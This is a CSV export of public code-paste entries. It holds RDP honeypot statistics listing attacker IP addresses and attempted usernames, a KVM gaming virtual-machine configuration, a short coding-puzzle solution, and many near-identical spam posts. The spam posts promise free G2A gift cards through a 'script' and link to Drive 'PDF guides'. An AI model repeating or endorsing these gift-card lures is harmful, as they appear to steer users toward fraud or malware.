id,title,username,language,date,content
wfkA1EEi,2024-06-24_stats.json,rdp_snitch,JSON,Monday 24th of June 2024 07:16:09 PM CDT,"{
  ""ip"": {
    ""139.59.123.230"": 254,
    ""222.132.26.43"": 4,
    ""35.220.223.242"": 4,
    ""164.92.104.215"": 4,
    ""103.184.193.137"": 2,
    ""45.79.167.175"": 2,
    ""198.235.24.197"": 6,
    ""84.17.46.140"": 2,
    ""192.53.120.191"": 18,
    ""64.124.50.139"": 4,
    ""67.207.93.115"": 2,
    ""103.121.74.4"": 2,
    ""68.183.187.219"": 4,
    ""185.170.144.3"": 4,
    ""196.188.118.227"": 2,
    ""124.71.139.40"": 8,
    ""45.227.254.26"": 4,
    ""91.238.181.71"": 4,
    ""87.251.75.120"": 2,
    ""185.150.1.204"": 2,
    ""147.185.132.61"": 6,
    ""194.165.16.11"": 4,
    ""194.26.135.155"": 6,
    ""45.227.254.8"": 4,
    ""165.154.12.38"": 2,
    ""205.210.31.183"": 6,
    ""213.109.202.251"": 12,
    ""71.178.173.22"": 2,
    ""194.180.49.249"": 2,
    ""45.156.129.120"": 2,
    ""147.78.47.97"": 2,
    ""167.94.145.107"": 2,
    ""45.227.254.55"": 4,
    ""147.185.132.138"": 6,
    ""194.165.16.72"": 4,
    ""104.248.154.46"": 2
  },
  ""asn"": {
    ""AS14061"": 266,
    ""AS4837"": 4,
    ""AS15169"": 4,
    ""AS133296"": 2,
    ""AS63949"": 20,
    ""AS396982"": 24,
    ""AS60068"": 2,
    ""AS6461"": 4,
    ""AS134886"": 2,
    ""AS197414"": 4,
    ""AS24757"": 2,
    ""AS55990"": 8,
    ""AS267784"": 12,
    ""AS49434"": 4,
    ""AS208091"": 2,
    ""AS212396"": 2,
    ""AS48721"": 8,
    ""AS57523"": 6,
    ""AS135377"": 2,
    ""AS208312"": 12,
    ""AS701"": 2,
    ""AS201814"": 2,
    ""AS211680"": 2,
    ""AS209588"": 2,
    ""AS398705"": 2
  },
  ""isp"": {
    ""DIGITALOCEAN"": 254,
    ""CHINA UNICOM China169 Backbone"": 4,
    ""Google LLC"": 28,
    ""DigitalOcean, LLC"": 12,
    ""Web Werks India Pvt. Ltd."": 2,
    ""Akamai Technologies, Inc."": 20,
    ""DataCamp Limited"": 2,
    ""Zayo Bandwidth"": 4,
    ""Super Sonic Broadband Pvt. Ltd"": 2,
    ""Xhost Internet Solutions LP"": 6,
    ""Ethiotelecom"": 2,
    ""Huawei Cloud Service data center"": 8,
    ""Flyservers S.A."": 22,
    ""Datacenter location PAR1 France"": 4,
    ""FyfeWeb Ltd"": 2,
    ""Chang Way Technologies Co. Limited"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Red Byte LLC"": 12,
    ""Verizon Communications"": 2,
    ""MEVSPACE sp. z o.o."": 2,
    ""NSEC - Sistemas Informaticos, S.A."": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 264,
    ""Wfedune EDU"": 4,
    ""Google Cloud (asia-east2)"": 4,
    ""Tridhati System Solutions LLP"": 2,
    ""Linode"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Cdn77 AMS"": 2,
    ""Linode, LLC"": 18,
    ""Microsoft Corporation"": 4,
    ""Digital Ocean"": 2,
    ""Super Sonic Broadband Pvt Ltd"": 2,
    ""Xhostis"": 4,
    ""Unknown"": 2,
    ""Huawei Cloud Service"": 8,
    ""UAB Host Baltic"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Xhost Internet Solutions"": 2,
    ""FyfeWeb Ltd"": 2,
    ""Flyservers S.A"": 10,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Ucloud Information Technology"": 2,
    ""MCI Communications Services, Inc. d/b/a Verizon Business"": 2,
    ""HostSlick"": 2,
    ""Inap CHI"": 2,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""South West"": 258,
    ""Beijing"": 4,
    ""Central and Western District"": 4,
    ""California"": 28,
    ""Haryana"": 2,
    ""New Jersey"": 4,
    ""North Holland"": 10,
    ""Ontario"": 18,
    ""Virginia"": 6,
    ""Maharashtra"": 2,
    ""Addis Ababa"": 2,
    ""Shanghai"": 8,
    ""Vilnius"": 12,
    ""\u00cele-de-France"": 4,
    ""England"": 2,
    ""Kaunas"": 8,
    ""Moscow"": 18,
    ""Dubai"": 2,
    ""Maryland"": 2,
    ""Illinois"": 2,
    ""Michigan"": 2,
    ""Central Singapore"": 2
  },
  ""country"": {
    ""Singapore"": 260,
    ""China"": 12,
    ""Hong Kong"": 4,
    ""United States"": 44,
    ""India"": 4,
    ""The Netherlands"": 10,
    ""Canada"": 18,
    ""Ethiopia"": 2,
    ""Lithuania"": 20,
    ""France"": 4,
    ""United Kingdom"": 2,
    ""Russia"": 18,
    ""United Arab Emirates"": 2
  },
  ""account"": {
    ""hello"": 312,
    ""KzJMBNGRx"": 2,
    ""XbUZvR"": 2,
    ""VaBjcw"": 2,
    ""Test"": 34,
    ""Administr"": 6,
    ""ysBHVEQSJ"": 2,
    ""HxmjRZ"": 2,
    ""higPQv"": 2,
    ""Domain"": 18,
    ""Administrator"": 2,
    ""LqwvbLwDJ"": 2,
    ""prMieD"": 2,
    ""MhUSNY"": 2,
    ""wzhdh2am"": 2,
    ""(empty)"": 2,
    ""dwIaWPHwG"": 2,
    ""lqRovd"": 2,
    ""xLBdJH"": 2
  },
  ""keyboard"": {
    ""Unknown"": 400
  },
  ""client_build"": {
    ""Unknown"": 400
  },
  ""client_name"": {
    ""Unknown"": 400
  },
  ""ip_type"": {
    ""hosting"": 330,
    ""Unknown"": 48,
    ""hosting & proxy"": 2,
    ""proxy"": 20
  }
}"
JW2uWHRf,2024-06-24_stats.json,rdp_snitch,JSON,Monday 24th of June 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""139.59.123.230"": 127,
    ""222.132.26.43"": 2,
    ""35.220.223.242"": 2,
    ""164.92.104.215"": 2,
    ""103.184.193.137"": 1,
    ""45.79.167.175"": 1,
    ""198.235.24.197"": 3,
    ""84.17.46.140"": 1,
    ""192.53.120.191"": 9,
    ""64.124.50.139"": 2,
    ""67.207.93.115"": 1,
    ""103.121.74.4"": 1,
    ""68.183.187.219"": 2,
    ""185.170.144.3"": 2,
    ""196.188.118.227"": 1,
    ""124.71.139.40"": 4,
    ""45.227.254.26"": 2,
    ""91.238.181.71"": 2,
    ""87.251.75.120"": 1,
    ""185.150.1.204"": 1,
    ""147.185.132.61"": 3,
    ""194.165.16.11"": 2,
    ""194.26.135.155"": 3,
    ""45.227.254.8"": 2,
    ""165.154.12.38"": 1,
    ""205.210.31.183"": 3,
    ""213.109.202.251"": 6,
    ""71.178.173.22"": 1,
    ""194.180.49.249"": 1,
    ""45.156.129.120"": 1,
    ""147.78.47.97"": 1,
    ""167.94.145.107"": 1,
    ""45.227.254.55"": 2,
    ""147.185.132.138"": 3,
    ""194.165.16.72"": 2,
    ""104.248.154.46"": 1
  },
  ""asn"": {
    ""AS14061"": 133,
    ""AS4837"": 2,
    ""AS15169"": 2,
    ""AS133296"": 1,
    ""AS63949"": 10,
    ""AS396982"": 12,
    ""AS60068"": 1,
    ""AS6461"": 2,
    ""AS134886"": 1,
    ""AS197414"": 2,
    ""AS24757"": 1,
    ""AS55990"": 4,
    ""AS267784"": 6,
    ""AS49434"": 2,
    ""AS208091"": 1,
    ""AS212396"": 1,
    ""AS48721"": 4,
    ""AS57523"": 3,
    ""AS135377"": 1,
    ""AS208312"": 6,
    ""AS701"": 1,
    ""AS201814"": 1,
    ""AS211680"": 1,
    ""AS209588"": 1,
    ""AS398705"": 1
  },
  ""isp"": {
    ""DIGITALOCEAN"": 127,
    ""CHINA UNICOM China169 Backbone"": 2,
    ""Google LLC"": 14,
    ""DigitalOcean, LLC"": 6,
    ""Web Werks India Pvt. Ltd."": 1,
    ""Akamai Technologies, Inc."": 10,
    ""DataCamp Limited"": 1,
    ""Zayo Bandwidth"": 2,
    ""Super Sonic Broadband Pvt. Ltd"": 1,
    ""Xhost Internet Solutions LP"": 3,
    ""Ethiotelecom"": 1,
    ""Huawei Cloud Service data center"": 4,
    ""Flyservers S.A."": 11,
    ""Datacenter location PAR1 France"": 2,
    ""FyfeWeb Ltd"": 1,
    ""Chang Way Technologies Co. Limited"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Red Byte LLC"": 6,
    ""Verizon Communications"": 1,
    ""MEVSPACE sp. z o.o."": 1,
    ""NSEC - Sistemas Informaticos, S.A."": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 132,
    ""Wfedune EDU"": 2,
    ""Google Cloud (asia-east2)"": 2,
    ""Tridhati System Solutions LLP"": 1,
    ""Linode"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Cdn77 AMS"": 1,
    ""Linode, LLC"": 9,
    ""Microsoft Corporation"": 2,
    ""Digital Ocean"": 1,
    ""Super Sonic Broadband Pvt Ltd"": 1,
    ""Xhostis"": 2,
    ""Unknown"": 1,
    ""Huawei Cloud Service"": 4,
    ""UAB Host Baltic"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Xhost Internet Solutions"": 1,
    ""FyfeWeb Ltd"": 1,
    ""Flyservers S.A"": 5,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Ucloud Information Technology"": 1,
    ""MCI Communications Services, Inc. d/b/a Verizon Business"": 1,
    ""HostSlick"": 1,
    ""Inap CHI"": 1,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""South West"": 129,
    ""Beijing"": 2,
    ""Central and Western District"": 2,
    ""California"": 14,
    ""Haryana"": 1,
    ""New Jersey"": 2,
    ""North Holland"": 5,
    ""Ontario"": 9,
    ""Virginia"": 3,
    ""Maharashtra"": 1,
    ""Addis Ababa"": 1,
    ""Shanghai"": 4,
    ""Vilnius"": 6,
    ""\u00cele-de-France"": 2,
    ""England"": 1,
    ""Kaunas"": 4,
    ""Moscow"": 9,
    ""Dubai"": 1,
    ""Maryland"": 1,
    ""Illinois"": 1,
    ""Michigan"": 1,
    ""Central Singapore"": 1
  },
  ""country"": {
    ""Singapore"": 130,
    ""China"": 6,
    ""Hong Kong"": 2,
    ""United States"": 22,
    ""India"": 2,
    ""The Netherlands"": 5,
    ""Canada"": 9,
    ""Ethiopia"": 1,
    ""Lithuania"": 10,
    ""France"": 2,
    ""United Kingdom"": 1,
    ""Russia"": 9,
    ""United Arab Emirates"": 1
  },
  ""account"": {
    ""hello"": 156,
    ""KzJMBNGRx"": 1,
    ""XbUZvR"": 1,
    ""VaBjcw"": 1,
    ""Test"": 17,
    ""Administr"": 3,
    ""ysBHVEQSJ"": 1,
    ""HxmjRZ"": 1,
    ""higPQv"": 1,
    ""Domain"": 9,
    ""Administrator"": 1,
    ""LqwvbLwDJ"": 1,
    ""prMieD"": 1,
    ""MhUSNY"": 1,
    ""wzhdh2am"": 1,
    ""(empty)"": 1,
    ""dwIaWPHwG"": 1,
    ""lqRovd"": 1,
    ""xLBdJH"": 1
  },
  ""keyboard"": {
    ""Unknown"": 200
  },
  ""client_build"": {
    ""Unknown"": 200
  },
  ""client_name"": {
    ""Unknown"": 200
  },
  ""ip_type"": {
    ""hosting"": 165,
    ""Unknown"": 24,
    ""hosting & proxy"": 1,
    ""proxy"": 10
  }
}"
agD5mgvy,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,atakan1983,JavaScript,Monday 24th of June 2024 07:13:15 PM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
60y8fWbs,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,tajdiqul,JavaScript,Monday 24th of June 2024 07:07:10 PM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
90DE5sS1,VM gaming,NauTiluS1,XML,Monday 24th of June 2024 07:02:37 PM CDT,"<domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
  <name>win10</name>
  <uuid>d87179c1-75ac-4ed4-97e4-617f11595340</uuid>
  <title>Maquina de viciar</title>
  <description>Para eso mismo, para viciar</description>
  <memory unit='KiB'>16797696</memory>
  <currentMemory unit='KiB'>16797696</currentMemory>
  <vcpu placement='static' current='8'>16</vcpu>
  <vcpus>
    <vcpu id='0' enabled='yes' hotpluggable='no' order='1'/>
    <vcpu id='1' enabled='yes' hotpluggable='yes' order='2'/>
    <vcpu id='2' enabled='yes' hotpluggable='yes' order='3'/>
    <vcpu id='3' enabled='yes' hotpluggable='yes' order='4'/>
    <vcpu id='4' enabled='yes' hotpluggable='yes' order='5'/>
    <vcpu id='5' enabled='no' hotpluggable='yes'/>
    <vcpu id='6' enabled='no' hotpluggable='yes'/>
    <vcpu id='7' enabled='no' hotpluggable='yes'/>
    <vcpu id='8' enabled='yes' hotpluggable='yes' order='6'/>
    <vcpu id='9' enabled='no' hotpluggable='yes'/>
    <vcpu id='10' enabled='yes' hotpluggable='yes' order='7'/>
    <vcpu id='11' enabled='no' hotpluggable='yes'/>
    <vcpu id='12' enabled='yes' hotpluggable='yes' order='8'/>
    <vcpu id='13' enabled='no' hotpluggable='yes'/>
    <vcpu id='14' enabled='no' hotpluggable='yes'/>
    <vcpu id='15' enabled='no' hotpluggable='yes'/>
  </vcpus>
  <iothreads>2</iothreads>
  <iothreadids>
    <iothread id='1'/>
    <iothread id='2'/>
  </iothreadids>
  <cputune>
    <vcpupin vcpu='0' cpuset='11'/>
    <vcpupin vcpu='1' cpuset='5'/>
    <vcpupin vcpu='2' cpuset='10'/>
    <vcpupin vcpu='3' cpuset='4'/>
    <vcpupin vcpu='4' cpuset='9'/>
    <vcpupin vcpu='8' cpuset='8'/>
    <vcpupin vcpu='10' cpuset='7'/>
    <vcpupin vcpu='12' cpuset='6'/>
    <emulatorpin cpuset='0,2'/>
    <iothreadpin iothread='1' cpuset='1-3'/>
    <iothreadpin iothread='2' cpuset='1-3'/>
  </cputune>
  <numatune>
    <memory mode='strict' nodeset='0'/>
  </numatune>
  <resource>
    <partition>/machine</partition>
  </resource>
  <os>
    <type arch='x86_64' machine='pc-q35-9.0'>hvm</type>
    <loader readonly='yes' type='pflash'>/usr/share/ovmf/x64/OVMF_CODE.fd</loader>
    <nvram>/var/lib/libvirt/qemu/nvram/win10_VARS.fd</nvram>
    <bootmenu enable='yes'/>
  </os>
  <features>
    <acpi/>
    <apic/>
    <hyperv mode='custom'>
      <relaxed state='on'/>
      <vapic state='on'/>
      <spinlocks state='on' retries='8191'/>
      <vpindex state='on'/>
      <runtime state='on'/>
      <synic state='off'/>
      <stimer state='off'/>
      <reset state='off'/>
      <vendor_id state='on' value='PowerPro'/>
      <frequencies state='on'/>
      <tlbflush state='on'/>
    </hyperv>
    <kvm>
      <hidden state='on'/>
    </kvm>
    <vmport state='off'/>
    <ioapic driver='kvm'/>
  </features>
  <cpu mode='host-passthrough' check='partial' migratable='on'>
    <topology sockets='1' dies='1' clusters='1' cores='8' threads='2'/>
    <cache mode='passthrough'/>
    <feature policy='require' name='topoext'/>
    <feature policy='require' name='invtsc'/>
    <feature policy='disable' name='monitor'/>
    <feature policy='require' name='x2apic'/>
    <feature policy='require' name='svm'/>
    <feature policy='require' name='hypervisor'/>
    <feature policy='require' name='rdrand'/>
    <feature policy='require' name='tsc_adjust'/>
    <feature policy='require' name='clflushopt'/>
  </cpu>
  <clock offset='localtime'>
    <timer name='hpet' present='no'/>
    <timer name='hypervclock' present='yes'/>
    <timer name='pit' present='no' tickpolicy='discard'/>
    <timer name='tsc' present='yes' mode='native'/>
    <timer name='rtc' present='no' tickpolicy='catchup'/>
  </clock>
  <on_poweroff>destroy</on_poweroff>
  <on_reboot>restart</on_reboot>
  <on_crash>destroy</on_crash>
  <pm>
    <suspend-to-mem enabled='no'/>
    <suspend-to-disk enabled='no'/>
  </pm>
  <devices>
    <emulator>/home/nautilus/qemu9.0rc/bin/qemu-system-x86_64</emulator>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='threads'/>
      <source file='/run/media/nautilus/disk1/VM-DISKS/DATOS-win10hdd2.raw'/>
      <backingStore/>
      <target dev='sde' bus='scsi'/>
      <address type='drive' controller='3' bus='0' target='0' unit='4'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='threads'/>
      <source file='/run/media/nautilus/disk1/VM-DISKS/win10hdd3.raw'/>
      <backingStore/>
      <target dev='sdh' bus='scsi'/>
      <address type='drive' controller='2' bus='0' target='0' unit='0'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='threads'/>
      <source file='/run/media/nautilus/disk1/VM-DISKS/win10hdd4.raw'/>
      <backingStore/>
      <target dev='sdi' bus='scsi'/>
      <address type='drive' controller='1' bus='0' target='0' unit='1'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='threads' discard='unmap'/>
      <source file='/home/nautilus/KVM/windows10.raw'/>
      <backingStore/>
      <target dev='sdk' bus='scsi'/>
      <boot order='1'/>
      <address type='drive' controller='0' bus='0' target='0' unit='3'/>
    </disk>
    <disk type='file' device='cdrom'>
      <driver name='qemu' type='raw' cache='none'/>
      <backingStore/>
      <target dev='sda' bus='sata'/>
      <readonly/>
      <address type='drive' controller='0' bus='0' target='0' unit='0'/>
    </disk>
    <disk type='file' device='cdrom'>
      <driver name='qemu' type='raw' cache='none' io='threads'/>
      <source file='/run/media/nautilus/disk1/WIN-ISOS/virtio-win-0.1.215.iso'/>
      <backingStore/>
      <target dev='sdj' bus='sata'/>
      <readonly/>
      <address type='drive' controller='1' bus='0' target='0' unit='3'/>
    </disk>
    <controller type='sata' index='0'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1f' function='0x2'/>
    </controller>
    <controller type='sata' index='1'>
      <address type='pci' domain='0x0000' bus='0x02' slot='0x01' function='0x0'/>
    </controller>
    <controller type='pci' index='0' model='pcie-root'/>
    <controller type='pci' index='1' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='1' port='0x10'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='2' model='pcie-to-pci-bridge'>
      <model name='pcie-pci-bridge'/>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </controller>
    <controller type='pci' index='3' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='3' port='0x11'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x1'/>
    </controller>
    <controller type='pci' index='4' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='4' port='0x12'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x2'/>
    </controller>
    <controller type='pci' index='5' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='5' port='0x13'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x3'/>
    </controller>
    <controller type='pci' index='6' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='6' port='0x14'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x4'/>
    </controller>
    <controller type='pci' index='7' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='7' port='0x8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='8' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='8' port='0x9'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x1'/>
    </controller>
    <controller type='pci' index='9' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='9' port='0xa'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x2'/>
    </controller>
    <controller type='pci' index='10' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='10' port='0xb'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x3'/>
    </controller>
    <controller type='pci' index='11' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='11' port='0xc'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x4'/>
    </controller>
    <controller type='pci' index='12' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='12' port='0xd'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x5'/>
    </controller>
    <controller type='pci' index='13' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='13' port='0xe'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x6'/>
    </controller>
    <controller type='pci' index='14' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='14' port='0xf'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x7'/>
    </controller>
    <controller type='pci' index='15' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='15' port='0x15'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x5'/>
    </controller>
    <controller type='virtio-serial' index='0'>
      <address type='pci' domain='0x0000' bus='0x05' slot='0x00' function='0x0'/>
    </controller>
    <controller type='scsi' index='0' model='virtio-scsi'>
      <driver queues='4' ioeventfd='on' iothread='1'/>
      <address type='pci' domain='0x0000' bus='0x08' slot='0x00' function='0x0'/>
    </controller>
    <controller type='scsi' index='1' model='virtio-scsi'>
      <driver queues='2' ioeventfd='on' iothread='2'/>
      <address type='pci' domain='0x0000' bus='0x07' slot='0x00' function='0x0'/>
    </controller>
    <controller type='scsi' index='2' model='virtio-scsi'>
      <driver queues='2' ioeventfd='on' iothread='2'/>
      <address type='pci' domain='0x0000' bus='0x09' slot='0x00' function='0x0'/>
    </controller>
    <controller type='scsi' index='3' model='virtio-scsi'>
      <driver queues='2' ioeventfd='on' iothread='2'/>
      <address type='pci' domain='0x0000' bus='0x0e' slot='0x00' function='0x0'/>
    </controller>
    <controller type='usb' index='0' model='qemu-xhci' ports='15'>
      <address type='pci' domain='0x0000' bus='0x0b' slot='0x00' function='0x0'/>
    </controller>
    <interface type='bridge'>
      <mac address='52:54:00:4a:a1:10'/>
      <source bridge='kvm_bridge'/>
      <model type='virtio'/>
      <address type='pci' domain='0x0000' bus='0x0a' slot='0x00' function='0x0'/>
    </interface>
    <interface type='network'>
      <mac address='52:54:00:2b:1c:7d'/>
      <source network='isolated'/>
      <model type='virtio'/>
      <address type='pci' domain='0x0000' bus='0x0c' slot='0x00' function='0x0'/>
    </interface>
    <input type='mouse' bus='virtio'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x0e' function='0x0'/>
    </input>
    <input type='keyboard' bus='virtio'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x0f' function='0x0'/>
    </input>
    <input type='mouse' bus='ps2'/>
    <input type='keyboard' bus='ps2'/>
    <audio id='1' type='none'/>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x0'/>
      </source>
      <rom file='/etc/libvirt/hooks/qemu.d/bios_3070.rom'/>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x0'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x1'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <source>
        <address domain='0x0000' bus='0x27' slot='0x00' function='0x0'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
    </hostdev>
    <hostdev mode='subsystem' type='usb' managed='yes'>
      <source>
        <vendor id='0x0b05'/>
        <product id='0x17cb'/>
      </source>
      <address type='usb' bus='0' port='1'/>
    </hostdev>
    <watchdog model='itco' action='reset'/>
    <memballoon model='none'/>
    <rng model='virtio'>
      <backend model='random'>/dev/random</backend>
      <address type='pci' domain='0x0000' bus='0x0d' slot='0x00' function='0x0'/>
    </rng>
    <panic model='hyperv'/>
    <shmem name='looking-glass'>
      <model type='ivshmem-plain'/>
      <size unit='M'>64</size>
      <address type='pci' domain='0x0000' bus='0x02' slot='0x02' function='0x0'/>
    </shmem>
    <shmem name='scream-ivshmem'>
      <model type='ivshmem-plain'/>
      <size unit='M'>2</size>
      <address type='pci' domain='0x0000' bus='0x02' slot='0x11' function='0x0'/>
    </shmem>
  </devices>
  <seclabel type='dynamic' model='dac' relabel='yes'/>
  <qemu:commandline>
    <qemu:arg value='-object'/>
    <qemu:arg value='input-linux,id=mouse1,evdev=/dev/input/by-id/usb-SINOWEALTH_Wired_Gaming_Mouse-event-mouse'/>
    <qemu:arg value='-object'/>
    <qemu:arg value='input-linux,id=mouse2,evdev=/dev/input/by-id/usb-SINOWEALTH_Wired_Gaming_Mouse-if01-event-kbd'/>
    <qemu:arg value='-object'/>
    <qemu:arg value='input-linux,id=kbd1,evdev=/dev/input/by-id/usb-Dell_Dell_USB_Keyboard-event-kbd,grab_all=on,repeat=on'/>
    <qemu:arg value='-object'/>
    <qemu:arg value='input-linux,id=kbd2,evdev=/dev/input/by-id/usb-Dell_Dell_USB_Keyboard-event-if01'/>
    <qemu:arg value='-overcommit'/>
    <qemu:arg value='cpu-pm=on'/>
  </qemu:commandline>
</domain>

"
LZRH8Gjw,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,notgoodatscripting,JavaScript,Monday 24th of June 2024 07:01:07 PM CDT,"G2A.com free gift card & games guide.
Any gift card for free on G2A.com including Playstation gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
XcG6mHNL,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,bgill55,JavaScript,Monday 24th of June 2024 06:55:04 PM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Steam gift cards & everything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
yP1hkxeX,Algoverse_adesh_27,kucheasysa,Python,Monday 24th of June 2024 06:52:02 PM CDT,"class Solution:
    def flipAndInvertImage(self, image: List[List[int]]) -> List[List[int]]:
        for i in range(len(image)):
            image[i] = image[i][::-1]
            for j in range(len(image[i])):
                if image[i][j] == 0:
                    image[i][j] = 1
                else:
                    image[i][j] = 0
        return image"
uFLrvAFj,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,FreeRobux12345,JavaScript,Monday 24th of June 2024 06:49:00 PM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Playstation gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
T6td0XR7,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 üéÅ,jusst2k4,GetText,Monday 24th of June 2024 06:45:44 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_202503.pdf
 
Working as of:
25 June 2024"
Y84Kp6Qn,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,mikyser,JavaScript,Monday 24th of June 2024 06:42:56 PM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
SZU5a8RV,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,Ohtaku,JavaScript,Monday 24th of June 2024 06:36:52 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
ufgQBFby,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,Elii,JavaScript,Monday 24th of June 2024 06:30:48 PM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Xbox gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
KRTAtFnz,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,guywithabigheart,JavaScript,Monday 24th of June 2024 06:24:45 PM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Steam gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
